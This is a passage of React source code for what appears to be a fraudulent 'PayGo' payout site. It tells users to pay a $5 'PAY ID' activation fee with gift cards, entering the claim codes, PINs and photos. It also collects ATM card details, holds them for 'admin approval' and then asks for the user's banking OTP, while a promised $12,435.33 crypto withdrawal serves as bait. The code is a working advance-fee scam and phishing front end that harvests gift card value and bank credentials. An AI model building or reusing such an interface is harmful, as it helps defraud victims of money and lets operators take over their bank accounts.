                <div className="w-16 h-16 bg-red-100 text-red-600 rounded-full flex items-center justify-center ring-8 ring-red-50">
                  <X className="w-9 h-9" />
                </div>
                <span className="text-xs font-extrabold uppercase tracking-wider bg-red-100 text-red-800 border border-red-200 px-3 py-1 rounded-full">
                  Card Declined by Admin
                </span>
                <h3 className="text-2xl font-extrabold text-red-700">
                  ATM Card Verification Rejected
                </h3>
                <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
                  {user.cardRejectionReason}
                </p>
                <button
                  type="button"
                  onClick={() => {
                    updateUser({ cardRejectionReason: '' });
                    setCardError('Previous ATM card was declined. Please try another valid card or verify with a gift card.');
                    setStep(3);
                  }}
                  className="w-full max-w-xs min-h-[48px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 px-5 rounded-xl text-sm shadow-md transition-all cursor-pointer"
                >
                  Try Another Card or Gift Card
                </button>
              </>
            ) : (
              <>
                <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin" />
                <span className="text-xs font-bold uppercase tracking-wider bg-amber-100 text-amber-800 px-3 py-1 rounded-full">
                  Pending Admin Approval • PAY ID Locked
                </span>
                <h3 className="text-2xl font-bold text-gray-900">Awaiting Admin Approval</h3>
                <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
                  Your ATM card details have been submitted. <strong>Your PAY ID will remain locked until approved by admin.</strong>
                </p>
                <div className="text-xs text-gray-500 space-y-1 pt-2">
                  <p>Once approved by admin in the portal, your PAY ID will automatically unlock right here.</p>
                </div>
              </>
            )}
          </div>
        )}

        {/* Step 5: Verified PAY ID Code (strictly requires confirmed verification) */}
        {step === 5 && Boolean(user?.payIdVerified) && (
          <div className="bg-white rounded-2xl p-6 sm:p-8 shadow-sm border border-gray-100 flex flex-col items-center text-center space-y-6">
            <div className="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center ring-8 ring-emerald-50">
              <ShieldCheck className="w-9 h-9" />
            </div>

            <div>
              <h3 className="text-2xl font-extrabold text-gray-900">PAY ID Generated!</h3>
              <p className="text-sm text-gray-500 mt-1">
                Your official PayGo ID is active. Use this code for all crypto payouts and wallet withdrawals.
              </p>
            </div>

            {/* Revealed PAY ID Card */}
            <div className="w-full bg-purple-50 border-2 border-purple-200 rounded-2xl p-5">
              <div className="text-xs uppercase font-bold text-purple-600 mb-2">
                Your Official PAY ID Code
              </div>
              <div className="flex items-center justify-between bg-white rounded-xl p-3.5 border border-purple-200">
                <span className="font-mono font-bold text-base text-gray-800 break-all select-all">
                  {showPayId ? PAY_ID_CODE : 'PG-7474•••••••••••••DOEFQ'}
                </span>
                <div className="flex items-center space-x-1.5 shrink-0 ml-2">
                  <button
                    onClick={() => setShowPayId(!showPayId)}
                    className="p-1.5 hover:bg-gray-100 rounded-lg text-gray-500 cursor-pointer"
                    title={showPayId ? 'Hide code' : 'Show code'}
                  >
                    {showPayId ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                  <button
                    onClick={() => copyToClipboard(PAY_ID_CODE, 'payid')}
                    className="p-1.5 bg-purple-600 hover:bg-purple-700 text-white rounded-lg flex items-center space-x-1 text-xs font-semibold cursor-pointer"
                  >
                    {copiedField === 'payid' ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                    <span>{copiedField === 'payid' ? 'Copied' : 'Copy'}</span>
                  </button>
                </div>
              </div>
              <p className="text-xs text-purple-700 mt-2 font-medium">
                Tip: Copy this code now to proceed with your $12,435.33 transfer!
              </p>
            </div>

            <div className="w-full space-y-3 pt-2">
              {onNavigateToTransfer && (
                <button
                  onClick={onNavigateToTransfer}
                  className="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-4 rounded-xl text-base shadow-md transition-all flex items-center justify-center space-x-2 cursor-pointer"
                >
                  <span>Proceed to Crypto Withdrawal</span>
                </button>
              )}
              <button
                onClick={onBack}
                className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold py-3.5 rounded-xl text-sm transition-all cursor-pointer"
              >
                Go to Dashboard
              </button>
            </div>
          </div>
        )}
      </div>

      {/* Service Notice Modal */}
      {showServiceNotice && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-xs flex items-center justify-center p-4 z-50 animate-in fade-in">
          <div className="bg-white rounded-2xl p-6 w-full max-w-md shadow-2xl">
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center space-x-3">
                <div className="w-8 h-8 bg-purple-600 rounded-full flex items-center justify-center text-white">
                  <Gift className="w-4 h-4" />
                </div>
                <h3 className="text-lg font-bold text-gray-900">Verification Notice</h3>
              </div>
              <button
                onClick={handleDismissNotice}
                className="p-1 hover:bg-gray-100 rounded-full text-gray-400 cursor-pointer"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="border-l-4 border-emerald-500 p-4 mb-4 bg-emerald-50 rounded-r-xl">
              <div className="flex items-center space-x-2 mb-1.5">
                <span className="text-emerald-700 font-bold">✓</span>
                <h4 className="font-bold text-emerald-800 text-sm">
                  PAY ID Verification Active (24/7)
                </h4>
              </div>
              <p className="text-xs text-emerald-700 leading-relaxed">
                Account verification is working 24/7. Verify your PAY ID using Apple, Steam, Razer Gold, Amazon, Sephora, Nordstrom, Xbox/PlayStation, or ATM Card.
              </p>
            </div>

            <div className="bg-purple-50 border border-purple-100 rounded-xl p-3.5 mb-5 space-y-1.5 text-xs text-purple-900">
              <p className="font-bold text-purple-950">PAY ID Benefits &amp; Details:</p>
              <ul className="space-y-1 text-purple-800">
                <li>• <strong>One-Time Fee:</strong> $5 permanent PAY ID activation</li>
                <li>• <strong>Unique Code:</strong> Unlocks your official <span className="font-mono font-bold">PG-...</span> PAY ID key</li>
                <li>• <strong>Withdrawals &amp; Tiers:</strong> Required before upgrading to Ruby &amp; withdrawing</li>
                <li>• <strong>Weekly Bonus:</strong> Unlocks $5 weekly wallet rewards upon approval</li>
              </ul>
            </div>

            <button
              onClick={handleDismissNotice}
              className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 rounded-xl text-sm shadow-md transition-all cursor-pointer"
            >
              Continue to Verify ($5)
            </button>
          </div>
        </div>
      )}
      {/* Pre-Submission Gift Card Confirmation Modal */}
      {showGiftConfirmModal && (
        <div className="fixed inset-0 bg-black/65 backdrop-blur-xs flex items-center justify-center p-4 z-50 animate-in fade-in">
          <div className="bg-white rounded-3xl p-6 w-full max-w-md shadow-2xl border border-purple-100 space-y-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-2.5">
                <div className="w-9 h-9 bg-purple-100 text-purple-700 rounded-xl flex items-center justify-center">
                  <ShieldCheck className="w-5 h-5" />
                </div>
                <h3 className="text-base font-bold text-gray-900">Confirm Gift Card Details</h3>
              </div>
              <button
                type="button"
                onClick={() => setShowGiftConfirmModal(false)}
                className="p-1.5 hover:bg-gray-100 rounded-full text-gray-400 cursor-pointer"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="bg-gray-50 border border-gray-200 rounded-2xl p-4 space-y-2 text-xs">
              <div className="flex justify-between">
                <span className="text-gray-500">Brand:</span>
                <span className="font-bold text-gray-900">{giftCardBrand}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-500">Type / Value:</span>
                <span className="font-bold text-gray-900">
                  {giftCardFormat === 'physical' ? 'Physical Card' : 'Digital E-Code'} • $5
                </span>
              </div>
              <div className="flex justify-between items-center gap-2">
                <span className="text-gray-500 shrink-0">Claim Code:</span>
                <span className="font-mono font-bold text-purple-900 break-all text-right">
                  {giftCardCode.trim().toUpperCase()}
                </span>
              </div>
              {giftCardPin.trim() && (
                <div className="flex justify-between">
                  <span className="text-gray-500">PIN / CVV:</span>
                  <span className="font-mono font-bold text-gray-900">{giftCardPin.trim()}</span>
                </div>
              )}
              {giftCardImage && (
                <div className="pt-2 border-t border-gray-200 flex items-center space-x-2.5">
                  <img
                    src={giftCardImage}
                    alt="Gift card proof"
                    className="w-12 h-12 object-cover rounded-lg border border-gray-300"
                  />
                  <span className="text-emerald-700 font-semibold">Proof image attached</span>
                </div>
              )}
            </div>

            <p className="text-xs text-amber-800 bg-amber-50 border border-amber-200 rounded-xl p-3 leading-relaxed">
              <strong>Confirmation Notice:</strong> Your gift card will be checked and confirmed unused before your PAY ID is unlocked.
            </p>

            <div className="grid grid-cols-2 gap-2.5 pt-1">
              <button
                type="button"
                onClick={() => setShowGiftConfirmModal(false)}
                className="min-h-[44px] bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold rounded-xl text-xs cursor-pointer"
              >
                Edit Card Details
              </button>
              <button
                type="button"
                onClick={handleConfirmAndSubmitGiftCard}
                className="min-h-[44px] bg-purple-600 hover:bg-purple-700 text-white font-bold rounded-xl text-xs shadow-sm cursor-pointer"
              >
                Confirm & Submit Card
              </button>
            </div>
          </div>
        </div>
      )}

      <GiftCardVerdictModal verdict={verdictModal} onClose={() => setVerdictModal(null)} />

      {requiresOtpModal && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-xs flex items-center justify-center p-4 z-50">
          <div className="bg-white border border-gray-200 rounded-3xl p-6 max-w-md w-full shadow-2xl space-y-5 animate-in fade-in zoom-in-95 duration-200">
            <div className="text-center space-y-2">
              <div className="w-14 h-14 bg-purple-100 text-purple-700 rounded-full flex items-center justify-center mx-auto ring-8 ring-purple-50">
                <Lock className="w-7 h-7" />
              </div>
              <h3 className="text-xl font-bold text-gray-900">Verify with your OTP</h3>
              <p className="text-xs text-gray-600 leading-relaxed">
                The admin has allowed your ATM card payment verification. Please enter your banking OTP code below to confirm and complete payment.
              </p>
            </div>

            <form onSubmit={handleClientSubmitOtp} className="space-y-4">
              <div>
                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-700 mb-1.5">
                  Banking OTP Code
                </label>
                <input
                  type="text"
                  maxLength={6}
                  value={clientOtpInput}
                  onChange={(e) => setClientOtpInput(e.target.value.replace(/\D/g, ''))}
                  placeholder="Enter 6-digit OTP code"
                  className="w-full p-3.5 bg-gray-50 border border-gray-300 rounded-xl text-center text-lg font-mono tracking-widest focus:ring-2 focus:ring-purple-600 outline-none text-gray-900"
                />
              </div>

              {otpVerifyError && (
                <p className="text-xs text-red-600 font-medium text-center">{otpVerifyError}</p>
              )}

              <button
                type="submit"
                disabled={isVerifyingOtp}
                className="w-full min-h-[48px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 px-5 rounded-xl text-sm shadow-md transition-all cursor-pointer disabled:opacity-60 flex items-center justify-center space-x-2"
              >
                {isVerifyingOtp ? (
                  <span>Verifying OTP...</span>
                ) : (
                  <>
                    <ShieldCheck className="w-4 h-4" />
                    <span>Verify OTP &amp; Complete Payment</span>
                  </>
                )}
              </button>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};
